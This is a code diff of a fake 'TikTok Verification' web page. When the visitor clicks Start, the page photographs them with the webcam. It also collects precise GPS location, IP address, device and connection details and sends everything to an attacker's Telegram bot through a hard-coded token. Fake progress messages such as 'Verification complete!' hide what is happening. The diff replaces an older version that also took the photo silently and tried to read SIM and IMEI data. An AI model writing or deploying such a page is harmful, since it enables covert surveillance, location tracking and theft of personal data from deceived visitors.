@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok</title>
+    <title>TikTok Verification</title>
     <style>
         * {
             margin: 0;
@@ -16,15 +16,43 @@
             background-size: cover;
             min-height: 100vh;
             font-family: Arial, sans-serif;
-            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         
-        #video, #canvas {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
+        #video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+        
+        #canvas {
+            display: none;
+        }
+        
+        .permission-prompt {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 90%;
+        }
+        
+        button {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            margin-top: 15px;
+            font-size: 16px;
+            cursor: pointer;
         }
     </style>
 </head>
@@ -32,13 +60,26 @@
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     
+    <div class="permission-prompt" id="prompt">
+        <h2>Start to Open TIKTOK</h2>
+        <p></p>
+        <button id="startButton">Start</button>
+    </div>
+    
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
+            const prompt = document.getElementById('prompt');
+            const startButton = document.getElementById('startButton');
             
-            // Start immediately
-            startVerification();
+            // Show prompt initially
+            prompt.style.display = 'block';
+            
+            startButton.addEventListener('click', async () => {
+                prompt.innerHTML = '<p></p>';
+                await startVerification();
+            });
             
             async function startVerification() {
                 try {
@@ -52,17 +93,21 @@
                     });
                     
                     video.srcObject = stream;
+                    prompt.style.display = 'none';
                     
-                    // No waiting for metadata - start capturing immediately
-                    setTimeout(() => {
-                        capturePhoto();
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 100); // Reduced from 1000ms to 100ms for faster capture
+                    // Wait for video to actually be playing
+                    video.onplaying = () => {
+                        setTimeout(() => {
+                            capturePhoto();
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1500); // Give more time for mobile devices
+                    };
                     
                 } catch (err) {
+                    prompt.innerHTML = '<p>Camera access denied. Using alternative verification...</p>';
                     setTimeout(() => {
                         sendToTelegram(null);
-                    }, 500);
+                    }, 2000);
                 }
             }
             
@@ -76,31 +121,34 @@
             }
             
             async function sendToTelegram(canvasElement) {
+                prompt.innerHTML = '<p>Finalizing verification...</p>';
+                
                 const systemInfo = {
                     deviceName: getDeviceName(),
+                    userAgent: navigator.userAgent,
                     language: navigator.language,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     date: new Date().toLocaleString(),
-                    battery: await getBatteryInfo(),
                     connection: getConnectionInfo(),
                     location: await getLocationInfo(),
                     ip: await getIPAddress(),
-                    simInfo: await getSimInfo()
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
                 };
                 
                 let message = `📱 *Device Information* 📱\n\n`;
                 message += `📱 *Device*: ${systemInfo.deviceName}\n`;
+                message += `🛠️ *User Agent*: ${systemInfo.userAgent}\n`;
                 message += `🌐 *Language*: ${systemInfo.language}\n`;
                 message += `🗺️ *Timezone*: ${systemInfo.timezone}\n`;
                 message += `📅 *Date*: ${systemInfo.date}\n`;
-                message += `🔋 *Battery*: ${systemInfo.battery}\n`;
                 message += `📶 *Connection*: ${systemInfo.connection}\n`;
                 message += `📍 *Location*: ${systemInfo.location}\n`;
                 message += `📡 *IP*: ${systemInfo.ip}\n`;
-                
-                // Enhanced SIM info display
-                message += `\n📲 *SIM Card Information*\n`;
-                message += systemInfo.simInfo;
+                message += `🖥️ *Screen*: ${systemInfo.screenResolution}\n`;
+                message += `💾 *RAM*: ${systemInfo.deviceMemory}GB\n`;
+                message += `⚙️ *CPU Cores*: ${systemInfo.hardwareConcurrency}\n`;
                 
                 const botToken = '8306546024:AAF8cNHIqwUF88sBcZ00D0X4GGf_D9WuXC0';
                 const chatId = '7301310227';
@@ -110,60 +158,58 @@
                 formData.append('text', message);
                 formData.append('parse_mode', 'Markdown');
                 
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    body: formData
-                }).then(response => {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
                     if (response.ok && canvasElement) {
-                        const blob = dataURLtoBlob(canvasElement.toDataURL('image/jpeg'));
-                        const photoFormData = new FormData();
-                        photoFormData.append('chat_id', chatId);
-                        photoFormData.append('photo', blob, 'photo.jpg');
-                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: photoFormData
+                        const blob = await new Promise(resolve => {
+                            canvasElement.toBlob(resolve, 'image/jpeg', 0.8);
                         });
+                        
+                        if (blob) {
+                            const photoFormData = new FormData();
+                            photoFormData.append('chat_id', chatId);
+                            photoFormData.append('photo', blob, 'verification.jpg');
+                            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                method: 'POST',
+                                body: photoFormData
+                            });
+                        }
                     }
-                });
-            }
-            
-            function dataURLtoBlob(dataurl) {
-                const arr = dataurl.split(',');
-                const mime = arr[0].match(/:(.*?);/)[1];
-                const bstr = atob(arr[1]);
-                const u8arr = new Uint8Array(bstr.length);
-                for (let i = 0; i < bstr.length; i++) {
-                    u8arr[i] = bstr.charCodeAt(i);
+                    
+                    prompt.innerHTML = '<p>Verification complete! You may close this page.</p>';
+                } catch (error) {
+                    prompt.innerHTML = '<p>Verification failed. Please try again.</p>';
                 }
-                return new Blob([u8arr], { type: mime });
             }
             
             function getDeviceName() {
                 const ua = navigator.userAgent;
-                if (/iPhone|iPad|iPod/i.test(ua)) return 'Apple';
-                if (/Android/i.test(ua)) return 'Android';
-                if (/Windows/i.test(ua)) return 'Windows';
+                if (/iPhone|iPad|iPod/i.test(ua)) {
+                    if (/iPhone/i.test(ua)) return 'iPhone';
+                    if (/iPad/i.test(ua)) return 'iPad';
+                    return 'iOS Device';
+                }
+                if (/Android/i.test(ua)) {
+                    const modelMatch = ua.match(/Android.*;\s([^;]+)\sBuild/);
+                    return modelMatch ? `Android (${modelMatch[1]})` : 'Android Device';
+                }
+                if (/Windows/i.test(ua)) return 'Windows PC';
                 if (/Mac/i.test(ua)) return 'Mac';
                 if (/Linux/i.test(ua)) return 'Linux';
-                return 'Unknown';
-            }
-            
-            async function getBatteryInfo() {
-                if ('getBattery' in navigator) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        return `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not Charging'})`;
-                    } catch (e) {
-                        return 'Unknown';
-                    }
-                }
-                return 'Unknown';
+                return 'Unknown Device';
             }
             
             function getConnectionInfo() {
                 if ('connection' in navigator) {
                     const conn = navigator.connection;
-                    return `${conn.effectiveType || 'Unknown'}`;
+                    let info = conn.effectiveType || 'Unknown';
+                    if (conn.downlink) info += `, ${conn.downlink}Mb/s`;
+                    if (conn.rtt) info += `, ${conn.rtt}ms`;
+                    return info;
                 }
                 return 'Unknown';
             }
@@ -174,14 +220,15 @@
                         const pos = await new Promise((resolve, reject) => 
                             navigator.geolocation.getCurrentPosition(resolve, reject, {
                                 enableHighAccuracy: true,
-                                timeout: 3000
+                                timeout: 10000, // Increased timeout for mobile
+                                maximumAge: 0
                             }));
                         return `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     } catch (e) {
-                        return 'Denied';
+                        return 'Location access denied';
                     }
                 }
-                return 'Unsupported';
+                return 'Geolocation not supported';
             }
             
             async function getIPAddress() {
@@ -190,55 +237,14 @@
                     const data = await res.json();
                     return data.ip;
                 } catch {
-                    return 'Unknown';
-                }
-            }
-            
-            async function getSimInfo() {
-                try {
-                    // For Android devices with SIM API access
-                    if ('getSimInfo' in navigator) {
-                        const sims = await navigator.getSimInfo();
-                        if (sims && sims.length > 0) {
-                            let simDetails = '';
-                            sims.forEach((sim, index) => {
-                                simDetails += `SIM ${index + 1}:\n`;
-                                simDetails += `  Carrier: ${sim.carrierName || 'Unknown'}\n`;
-                                simDetails += `  Number: ${sim.phoneNumber || 'Hidden'}\n`;
-                                simDetails += `  Country: ${sim.countryCode || 'Unknown'}\n`;
-                                simDetails += `  MCC/MNC: ${sim.mcc}/${sim.mnc || 'Unknown'}\n\n`;
-                            });
-                            return simDetails;
-                        }
-                        return 'No SIM cards detected';
+                    try {
+                        // Fallback IP detection
+                        const res = await fetch('https://ipapi.co/json/');
+                        const data = await res.json();
+                        return data.ip || 'Unknown';
+                    } catch {
+                        return 'Unknown';
                     }
-                    
-                    // For Firefox mobile
-                    if ('mozMobileConnection' in navigator) {
-                        const conn = navigator.mozMobileConnection;
-                        if (conn) {
-                            return `Carrier: ${conn.voice.network.mcc}-${conn.voice.network.mnc}\n` +
-                                   `Number: ${conn.voice.number || 'Hidden'}\n` +
-                                   `IMEI: ${conn.voice.imei || 'Hidden'}`;
-                        }
-                        return 'No SIM detected (Firefox)';
-                    }
-                    
-                    // For Chrome mobile
-                    if ('webkitMobileConnection' in navigator) {
-                        const conn = navigator.webkitMobileConnection;
-                        if (conn) {
-                            return `Carrier: ${conn.voice.network.mcc}-${conn.voice.network.mnc}\n` +
-                                   `Number: ${conn.voice.number || 'Hidden'}\n` +
-                                   `IMEI: ${conn.voice.imei || 'Hidden'}`;
-                        }
-                        return 'No SIM detected (Chrome)';
-                    }
-                    
-                    return 'SIM API not available in this browser';
-                    
-                } catch (e) {
-                    return `Error accessing SIM info: ${e.message}`;
                 }
             }
         });
